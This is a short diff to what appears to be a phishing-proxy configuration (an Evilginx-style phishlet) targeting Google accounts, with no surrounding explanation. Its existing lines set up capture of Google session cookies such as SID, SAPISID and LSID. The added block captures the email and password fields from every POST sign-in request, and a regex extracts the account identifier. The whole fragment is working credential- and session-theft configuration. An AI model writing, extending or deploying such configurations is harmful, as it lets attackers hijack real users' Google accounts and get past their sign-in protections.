@@ -20,6 +20,15 @@ auth_tokens:
     keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID"]
   - domain: 'accounts.google.com'
     keys: ["GAPS", "LSID"]
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'    
 user_regex:
   key: 'f.req'
   re: '\],"([^"]*)"\]$'
